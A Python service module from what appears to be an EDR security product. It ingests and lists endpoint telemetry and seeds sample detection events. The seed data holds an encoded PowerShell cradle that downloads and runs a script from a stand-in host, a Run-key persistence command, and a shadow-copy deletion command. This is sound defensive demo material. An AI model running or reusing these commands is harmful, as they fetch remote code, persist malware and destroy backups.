"""
backend/app/services/endpoint_telemetry_service.py
=================================================
Phase 22 Endpoint Telemetry Normalization & Ingestion Service.
Normalizes PROCESS, FILE, REGISTRY, AUTHENTICATION, NETWORK, PERSISTENCE, PRIVILEGE, and SYSTEM events.
"""

import logging
from datetime import datetime, timezone
from typing import Dict, Any, List, Optional
from sqlalchemy import select, desc
from sqlalchemy.ext.asyncio import AsyncSession

from backend.app.models.endpoint_xdr import EndpointTelemetryEvent

logger = logging.getLogger("Aegivanta.EndpointTelemetry")

DEFAULT_ENDPOINT_EVENTS = [
    {
        "sensor_id": "sensor-edr-node-01",
        "hostname": "WKS-EXEC-FINANCE-04",
        "event_category": "PROCESS",
        "process_name": "powershell.exe",
        "process_path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "process_cmdline": "powershell.exe -ExecutionPolicy Bypass -NoProfile -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIANgAvAGEAZwBlAG4AdAAnACkA",
        "parent_process_name": "winword.exe",
        "user_account": "CORP\\jsmith_fin",
        "severity": "CRITICAL",
        "raw_event": {"integrity_level": "Medium", "session_id": 2}
    },
    {
        "sensor_id": "sensor-edr-node-01",
        "hostname": "WKS-EXEC-FINANCE-04",
        "event_category": "REGISTRY",
        "process_name": "reg.exe",
        "registry_key": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdateHelper",
        "process_cmdline": "reg.exe add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsUpdateHelper /t REG_SZ /d C:\\ProgramData\\updater.exe /f",
        "user_account": "CORP\\jsmith_fin",
        "severity": "HIGH",
        "raw_event": {"action": "SetValue"}
    },
    {
        "sensor_id": "sensor-edr-node-01",
        "hostname": "WKS-EXEC-FINANCE-04",
        "event_category": "NETWORK",
        "process_name": "powershell.exe",
        "target_ip": "198.51.100.26",
        "target_port": 8443,
        "user_account": "CORP\\jsmith_fin",
        "severity": "HIGH",
        "raw_event": {"protocol": "TCP", "bytes_sent": 4520, "bytes_rcvd": 124000}
    },
    {
        "sensor_id": "sensor-edr-node-02",
        "hostname": "SRV-CORE-DC-01",
        "event_category": "AUTHENTICATION",
        "process_name": "lsass.exe",
        "user_account": "CORP\\Administrator",
        "severity": "MEDIUM",
        "raw_event": {"logon_type": 3, "auth_package": "NTLM", "status": "SUCCESS"}
    },
    {
        "sensor_id": "sensor-edr-node-02",
        "hostname": "SRV-CORE-DC-01",
        "event_category": "PRIVILEGE",
        "process_name": "cmd.exe",
        "process_cmdline": "vssadmin.exe delete shadows /all /quiet",
        "user_account": "CORP\\Administrator",
        "severity": "CRITICAL",
        "raw_event": {"elevation_type": "TokenElevationTypeFull"}
    }
]


class EndpointTelemetryService:
    """Ingests and queries normalized endpoint event streams."""

    @classmethod
    async def ingest_event(
        cls,
        db: AsyncSession,
        tenant_id: str,
        sensor_id: str,
        hostname: str,
        event_category: str,
        process_name: Optional[str] = None,
        process_path: Optional[str] = None,
        process_cmdline: Optional[str] = None,
        parent_process_name: Optional[str] = None,
        user_account: Optional[str] = None,
        file_path: Optional[str] = None,
        file_hash_sha256: Optional[str] = None,
        target_ip: Optional[str] = None,
        target_port: Optional[int] = None,
        registry_key: Optional[str] = None,
        severity: str = "INFORMATIONAL",
        raw_event: Optional[Dict[str, Any]] = None
    ) -> EndpointTelemetryEvent:
        """Ingests a single normalized endpoint event."""
        event = EndpointTelemetryEvent(
            tenant_id=tenant_id,
            sensor_id=sensor_id,
            hostname=hostname,
            event_category=event_category.upper(),
            process_name=process_name,
            process_path=process_path,
            process_cmdline=process_cmdline,
            parent_process_name=parent_process_name,
            user_account=user_account,
            file_path=file_path,
            file_hash_sha256=file_hash_sha256,
            target_ip=target_ip,
            target_port=target_port,
            registry_key=registry_key,
            severity=severity.upper(),
            raw_event=raw_event or {},
            timestamp=datetime.now(timezone.utc)
        )
        db.add(event)
        await db.flush()
        return event

    @classmethod
    async def list_telemetry_events(
        cls,
        db: AsyncSession,
        tenant_id: str,
        event_category: Optional[str] = None,
        hostname: Optional[str] = None,
        limit: int = 50
    ) -> List[Dict[str, Any]]:
        """Queries normalized endpoint telemetry events."""
        stmt = select(EndpointTelemetryEvent).where(EndpointTelemetryEvent.tenant_id == tenant_id)
        if event_category:
            stmt = stmt.where(EndpointTelemetryEvent.event_category == event_category.upper())
        if hostname:
            stmt = stmt.where(EndpointTelemetryEvent.hostname == hostname)

        stmt = stmt.order_by(desc(EndpointTelemetryEvent.timestamp)).limit(limit)
        events = list((await db.execute(stmt)).scalars().all())

        if not events and not event_category and not hostname:
            # Seed default baseline events
            for item in DEFAULT_ENDPOINT_EVENTS:
                inst = EndpointTelemetryEvent(
                    tenant_id=tenant_id,
                    sensor_id=item["sensor_id"],
                    hostname=item["hostname"],
                    event_category=item["event_category"],
                    process_name=item.get("process_name"),
                    process_path=item.get("process_path"),
                    process_cmdline=item.get("process_cmdline"),
                    parent_process_name=item.get("parent_process_name"),
                    user_account=item.get("user_account"),
                    target_ip=item.get("target_ip"),
                    target_port=item.get("target_port"),
                    registry_key=item.get("registry_key"),
                    severity=item["severity"],
                    raw_event=item["raw_event"],
                    timestamp=datetime.now(timezone.utc)
                )
                db.add(inst)
            await db.flush()

            stmt2 = select(EndpointTelemetryEvent).where(EndpointTelemetryEvent.tenant_id == tenant_id).order_by(desc(EndpointTelemetryEvent.timestamp)).limit(limit)
            events = list((await db.execute(stmt2)).scalars().all())

        return [
            {
                "id": e.id,
                "sensor_id": e.sensor_id,
                "hostname": e.hostname,
                "event_category": e.event_category,
                "process_name": e.process_name,
                "process_cmdline": e.process_cmdline,
                "parent_process_name": e.parent_process_name,
                "user_account": e.user_account,
                "target_ip": e.target_ip,
                "target_port": e.target_port,
                "registry_key": e.registry_key,
                "severity": e.severity,
                "timestamp": e.timestamp.isoformat() if e.timestamp else None
            }
            for e in events
        ]
